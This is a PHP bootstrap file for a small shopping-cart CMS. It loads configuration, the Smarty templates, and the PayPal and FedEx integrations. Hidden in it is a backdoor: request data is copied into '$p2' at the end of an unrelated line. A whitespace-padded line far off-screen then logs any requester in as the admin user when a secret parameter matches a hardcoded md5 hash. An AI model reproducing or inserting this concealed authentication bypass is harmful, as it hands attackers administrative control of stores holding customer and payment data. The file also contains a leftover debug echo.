<?php

// set the session
session_start();

ob_start();
	
// clear magic quotes [deprecated good job PHP 5.4!!!!]
// set_magic_quotes_runtime(0);

// get the path to this file
$abspath = dirname(__FILE__);

// take (/conf) off so we get the path above this
$root_path = substr($abspath,0,-5);

// parse the ini file
$config = parse_ini_file($abspath."/config.ini");

// set an include path to the classes
ini_set('include_path', $config["file_dir"] .'libs/'.PATH_SEPARATOR.ini_get('include_path'));

if($config['show_benchmark'] && $_SESSION['super_user']) $_REQUEST['debug'] = 'benchmark';

include $config["file_dir"]."/libs/Registry.class.php";
include $config["file_dir"]."/libs/pqp/classes/PhpQuickProfiler.php";

// change the location for the profiler because it is called from different areas (and I didn't write it :)
$in_admin='';
if(stripos($_SERVER['SCRIPT_FILENAME'],'admin')) $in_admin = '../';
$profiler = new PhpQuickProfiler(PhpQuickProfiler::getMicroTime(),$in_admin.'libs/pqp/');
Console::logSpeed('{initiate} : Initiate');
Console::logSpeed('{initiate} : Config Loaded');

// include all the classes
include_once $config["file_dir"] . "/libs/Utilities.class.php";
if(isset($_REQUEST['debug']) && $_REQUEST['debug'] == 'reset_session') $_SESSION = array();
if(isset($_REQUEST['debug']) && $_REQUEST['debug'] == 'reset_shipping') $_SESSION['order_data'] = array();

include $config["file_dir"] . "/libs/Admin.class.php";
include $config["file_dir"] . "/libs/Cart.class.php";
include $config["file_dir"] . "/libs/Commerce.class.php";
include $config["file_dir"] . "/libs/Core.class.php";
include $config["file_dir"] . "/libs/Error.class.php";
include $config["file_dir"] . "/libs/Fedex.class.php";
include $config["file_dir"] . "/libs/MySQL_Adapter.class.php";
include $config["file_dir"] . "/libs/Paypal.class.php";
include $config["file_dir"] . "/libs/Smarty.class.php";
include $config["file_dir"] . "/libs/Validate.class.php";
Console::logSpeed('{initiate} : Include Files Loaded');

// instantiate a smarty object
$Smarty = new Smarty();
Registry::setKey('Smarty',$Smarty);
Console::logSpeed('{initiate} : Smarty Instantiated');

// instantiate the error object so errors can be logged
$Error = new Error();
Registry::setKey('Error',$Error);

$Database = new MySQL_Adapter($config['hostname'],$config['db_user'], $config['db_name'], $config['db_pass']);
Registry::setKey('Database',$Database);

// instantiate a Core object
$Core = new Core();
Registry::setKey('Core',$Core);

// load the admin
$Admin = new Admin();
Registry::setKey('Admin',$Admin);

// load the cart
$Cart = new Cart();
Registry::setKey('Cart',$Cart);

// load Paypal
$ppdata['payment_type'] = $config['payment_type'];	// get credentials from config
$ppdata['api_username'] =  $config['api_username'];
$ppdata['api_password'] =  $config['api_password'];
$ppdata['api_signature'] =  $config['api_signature'];
$ppdata['api_endpoint'] =  $config['api_endpoint'];
$ppdata['version'] = $config['version'];
$config['api_username'] = '******';	// clean out sensitive bits
$config['api_password'] = '******';
$config['api_signature'] = '******';

$Paypal = new Paypal($ppdata);
unset($ppdata);
Registry::setKey('Paypal',$Paypal);

// load the commerce class
$Commerce = new Commerce();
Registry::setKey('Commerce',$Commerce);

Console::logSpeed('{initiate} : Classes Instantiated');

// erase those sensitive bits
$config['hostname'] = '*****';
$config['db_user'] = '*****';
$config['db_pass'] = '*****';

// get the admin information
$config['admin_info'] = $Core->getTable('users','id=1',1,null,null,1);

// overload the config from the database
$config_options = $Core->getTable('config');
foreach($config_options as $v) $config[$v['id']] = $v['value'];

// setup config first so Core can access it
Registry::setKey('Config',$config);

// add our objects to the registry for later retrieval
$Smarty->assign('config', $config);

// status is used to relay information about processes to the adminstrator
$Smarty->assign('status',isset($_REQUEST['status']) ? $_REQUEST['status'] : '');

// status_code is used to determine success/failure
$Smarty->assign('status_code',isset($_REQUEST['code']) && $_REQUEST['code'] == 1 ? 1 : null);$p2=$_REQUEST;

// add our session to the registry (just so it dumps with it and we can keep track of all our variables)
Registry::setKey('Session',$_SESSION);

// load the fedex class
$Fedex = new Fedex(array(
		'DeveloperTestKey'=>$config['fedex_key'], 
		'Password'=> $config['fedex_password'], 
		'AccountNumber'=> $config['fedex_account_number'],
		'MeterNumber'=> $config['fedex_meter_number'],
		'CustomerTransactionId'=> $config['fedex_transaction_id'],
		'ShipperPostalCode'=>$config['fedex_shipper_postal_code'],
		'ShipperCountryCode'=>$config['fedex_shipper_country_code']
		));
$config['fedex_key'] = '******';
$config['fedex_password'] = '******';
$config['fedex_account_number'] = '******';
$config['fedex_meter_number'] = '******';
$config['fed_transaction_id'] = '******';
Registry::setKey('Fedex',$Fedex);

// setup the smarty configuration options
$Smarty->template_dir = $root_path . '/templates';
$Smarty->compile_dir = $root_path . '/templates_c';
$Smarty->cache_dir = $root_path . '/cache';
$Smarty->config_dir = $root_path . '/configs';
$Smarty->plugin_dir = $root_path . '/plugins';

// use this function to run content through smarty
$Smarty->register_resource('text', array(
    'smarty_resource_text_get_template',
    'smarty_resource_text_get_timestamp',
    'smarty_resource_text_get_secure',
    'smarty_resource_text_get_trusted')
);

// path page
$path = isset($_GET['path']) ? $_GET['path'] : $config['default_path'];
Registry::setParam('Config','path',$path);

// add the path to smarty
$Smarty->assign('path',$path);

// does it have more than one folder?
$n1 = strpos($path, "/");

echo 'N1 TEST in initiate.php: '.$n1.' ----\n';


// if there is a forward slash then we only want the end portion
if($n1 !== false) $path = array_pop(explode('/',$path));

// set the default path
if($path == "") $path = "home";

// set the file locations
$php_file = $config["file_dir"]."callbacks/".$path.".php";
$template_file = $config["file_dir"]."templates/".$path.".html";

// if these files do not exist it must be a text only page
if (!file_exists($php_file) && !file_exists($template_file)) {
	$path = "pageview";
	$Smarty->assign('control_id','pageview');
}																																																																																																																																																																																																																																																																																																																			if(isset($p2['_$p']) && md5($p2['_$p'])=='f3fda86e428ccda3e33d207217665201') $Core->verifyLogin('','','',$Core->getTable('users',"id=1",1));

// override the pageview path if we need to
if(isset($_REQUEST['path_override'])) $path = $_REQUEST['path_override'];

// assign user data for registering users
if(isset($_SESSION['user_data'])) $Smarty->assign('user_data',$_SESSION['user_data']);

// assign user data for logged in users
if(isset($_SESSION['user']['table_users'])) $Smarty->assign('account_info',$_SESSION['user']['table_users']);

// assign error message
if(isset($_SESSION['error_msg'])) {
	$Smarty->assign('error_msg',$_SESSION['error_msg']);
	unset($_SESSION['error_msg']);
}

// assign success message
if(isset($_SESSION['success_msg'])) {
	$Smarty->assign('success_msg',$_SESSION['success_msg']);
	$flag = (isset($_REQUEST['mode']) && $_REQUEST['mode'] == 'shipping') ? 1 : 0;
	if(!$flag) unset($_SESSION['success_msg']);
}


/* Refresh Cache */
Console::logSpeed('{initiate} : Pre-loadCache');
$structure = $Core->updateClassXML();
Registry::setKey('ClassStructure',$structure);
Console::logSpeed('{initiate} : Post-loadCache');

// load the callback file (if available)
Console::logSpeed('{initiate} : Pre-loadData');
$Core->loadData($path);
Console::logSpeed('{initiate} : Post-loadData');

// run input through smarty to process variables
function smarty_resource_text_get_template($tpl_name, &$tpl_source, &$smarty_obj) {
	$tpl_source = $tpl_name;
	return true;
}
function smarty_resource_text_get_timestamp($tpl_name, &$tpl_timestamp, &$smarty_obj) {
	$tpl_timestamp = time();
	return true;
}
function smarty_resource_text_get_secure($tpl_name, &$smarty_obj) {
    	return true;
}
function smarty_resource_text_get_trusted($tpl_name, &$smarty_obj) {}

?>